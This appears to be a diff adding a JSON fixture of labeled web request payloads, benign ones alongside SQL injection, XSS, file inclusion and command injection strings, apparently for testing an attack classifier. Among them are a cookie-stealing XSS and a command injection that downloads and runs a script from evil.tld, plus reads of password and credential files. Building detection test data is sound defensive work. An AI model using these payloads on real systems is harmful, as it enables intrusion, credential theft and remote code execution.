@@ -1,0 +1,102 @@
+[
+    {
+        "payload": "category=books&author=O%27Reilly+Media&year=2026",
+        "expected_class": "BENIGN"
+    },
+    {
+        "payload": "{\"action\":\"update_profile\",\"timezone\":\"America/New_York\",\"notifications\":true}",
+        "expected_class": "BENIGN"
+    },
+    {
+        "payload": "note=Please+drop+by+the+office+or+select+a+time+slot+for+our+meeting.",
+        "expected_class": "BENIGN"
+    },
+    {
+        "payload": "download=reports/2026/annual_audit_final.xlsx",
+        "expected_class": "BENIGN"
+    },
+    {
+        "payload": "token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW5fdGVzdCJ9.sig12345",
+        "expected_class": "BENIGN"
+    },
+    {
+        "payload": "user=admin%27%20OR%20%27x%27%3D%27x%27--",
+        "expected_class": "SQLI"
+    },
+    {
+        "payload": "id=-999 UNION SELECT 1,load_file('/etc/mysql/my.cnf'),3--",
+        "expected_class": "SQLI"
+    },
+    {
+        "payload": "sort=price ASC; SELECT pg_sleep(10)--",
+        "expected_class": "SQLI"
+    },
+    {
+        "payload": "login=' OR true #",
+        "expected_class": "SQLI"
+    },
+    {
+        "payload": "item_id=42'/**/AND/**/1=0/**/UNION/**/SELECT/**/username,password/**/FROM/**/accounts--",
+        "expected_class": "SQLI"
+    },
+    {
+        "payload": "<svg/onload=confirm(document.cookie)>",
+        "expected_class": "XSS"
+    },
+    {
+        "payload": "q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "expected_class": "XSS"
+    },
+    {
+        "payload": "redirect=javascript:eval('alert(document.domain)')",
+        "expected_class": "XSS"
+    },
+    {
+        "payload": "<iframe onload=alert('XSS') src=about:blank></iframe>",
+        "expected_class": "XSS"
+    },
+    {
+        "payload": "name=' onclick='window.location=\"https://evil.tld/?\"+document.cookie'",
+        "expected_class": "XSS"
+    },
+    {
+        "payload": "page=../../../../etc/passwd%00.html",
+        "expected_class": "LFI"
+    },
+    {
+        "payload": "template=php://filter/convert.base64-encode/resource=../../.env",
+        "expected_class": "LFI"
+    },
+    {
+        "payload": "file=..%2f..%2f..%2fvar%2flog%2fnginx%2ferror.log",
+        "expected_class": "LFI"
+    },
+    {
+        "payload": "include=..\\..\\..\\windows\\boot.ini",
+        "expected_class": "LFI"
+    },
+    {
+        "payload": "path=/var/www/html/../../../root/.bash_history",
+        "expected_class": "LFI"
+    },
+    {
+        "payload": "host=127.0.0.1; id; whoami",
+        "expected_class": "RCE"
+    },
+    {
+        "payload": "ip=10.0.0.1 && curl http://evil.tld/bot.sh -o /tmp/bot.sh && /bin/sh /tmp/bot.sh",
+        "expected_class": "RCE"
+    },
+    {
+        "payload": "cmd=`uname -a`",
+        "expected_class": "RCE"
+    },
+    {
+        "payload": "target=localhost | /bin/bash -c 'cat /etc/hosts'",
+        "expected_class": "RCE"
+    },
+    {
+        "payload": " ping=127.0.0.1 & cmd.exe /c netstat -an",
+        "expected_class": "RCE"
+    }
+]
